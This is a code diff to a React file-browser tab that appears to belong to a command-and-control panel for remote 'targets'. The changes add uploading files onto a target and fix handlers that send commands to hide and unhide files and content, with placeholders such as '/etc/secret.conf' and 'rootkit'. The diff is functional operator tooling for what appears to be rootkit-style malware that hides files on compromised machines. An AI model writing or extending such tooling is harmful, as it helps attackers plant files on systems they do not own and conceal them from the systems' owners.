@@ -3,7 +3,7 @@ import {
   ArrowLeft, RefreshCw, Search, Shield,
   Folder, FileText, LayoutGrid, LayoutList,
   Eye, EyeOff, Loader, Download, X,
-  CheckCircle, AlertCircle,
+  CheckCircle, AlertCircle, Upload,
 } from 'lucide-react'
 import { useSnapshot, _cache, HiddenSummary } from '../Target'
 
@@ -176,16 +176,16 @@ function PreviewPanel({ preview, onClose, onHideContent, onHideFile, online }) {
   )
 }
 
-export function FilesTab({ target: t, cmd, query, execCmd, startDownload, downloads, busy }) {
+export function FilesTab({ target: t, cmd, execCmd, uploadFile, startDownload, downloads, busy, refreshToken }) {
   const [cwd, setCwd] = useState('/')
   const [pathInput, setPathInput] = useState('/')
   const [pathEditing, setPathEditing] = useState(false)
-  const [pathError, setPathError] = useState(false)
   const [selected, setSelected] = useState(null)
   const [panel, setPanel] = useState('explorer')
   const [view, setView] = useState('list')
   const [fileFilter, setFileFilter] = useState('')
   const [preview, setPreview] = useState(null)
+	const uploadInput = useRef(null)
 
   const doPreview = useCallback((path) => {
     if (!startDownload) return
@@ -227,6 +227,9 @@ export function FilesTab({ target: t, cmd, query, execCmd, startDownload, downlo
   }, [execCmd, t.id])
 
   useEffect(() => { pendingNav.current = null; fetchDir(cwd) }, [cwd, fetchDir])
+  useEffect(() => {
+    if (t.online && !busy && refreshToken) fetchDir(cwd, true)
+  }, [refreshToken, t.online, busy, cwd, fetchDir])
 
   const navigateTo = (path, force) => {
     const base = pendingNav.current || cwd
@@ -277,6 +280,17 @@ export function FilesTab({ target: t, cmd, query, execCmd, startDownload, downlo
         <button className="nb-btn p-1.5" onClick={() => fetchDir(cwd, true)} title="Refresh">
           <RefreshCw size={16} className={snap.loading ? 'animate-spin' : ''} />
         </button>
+		<input ref={uploadInput} type="file" className="hidden" onChange={async e => {
+			const file = e.target.files?.[0]
+			if (!file) return
+			const path = `${cwd === '/' ? '' : cwd}/${file.name}`
+			await uploadFile(path, t.id, new Uint8Array(await file.arrayBuffer()))
+			e.target.value = ''
+			fetchDir(cwd, true)
+		}} />
+		<button className="nb-btn p-1.5" disabled={!t.online || busy} onClick={() => uploadInput.current?.click()} title="Upload file">
+			<Upload size={16} />
+		</button>
 
         {/* Breadcrumb / path input */}
         <div className="flex-1 min-w-0 border-2 border-border rounded-[var(--radius)] bg-bg overflow-hidden">
@@ -572,16 +586,16 @@ export function FilesTab({ target: t, cmd, query, execCmd, startDownload, downlo
       ) : (
         <div className="flex-1 overflow-auto">
           <HiddenSummary title="Hidden Files" icon={FileText} items={hiddenFiles}
-            onRemove={i => cmd(`UNHIDE FILE ${i}`)} onAdd={v => cmd(`HIDE FILE ${v}`)} placeholder="/etc/secret.conf" />
+            onRemove={v => cmd(`UNHIDE FILE ${v}`)} onAdd={v => cmd(`HIDE FILE ${v}`)} placeholder="/etc/secret.conf" />
           <HiddenSummary title="Hidden Content" icon={Search} items={hiddenContent}
-            onRemove={i => cmd(`UNHIDE CONTENT ${i}`)} onAdd={v => cmd(`HIDE CONTENT ${v}`)} placeholder="rootkit" />
+            onRemove={v => cmd(`UNHIDE CONTENT ${v}`)} onAdd={v => cmd(`HIDE CONTENT ${v}`)} placeholder="rootkit" />
         </div>
       )}
     </div>
   )
 }
 
-export function DownloadOverlay({ downloads, setDownloads, targetId, targets }) {
+export function DownloadOverlay({ downloads, setDownloads, targets }) {
   const [open, setOpen] = useState(false)
   const allEntries = Object.entries(downloads)
   const entries = allEntries
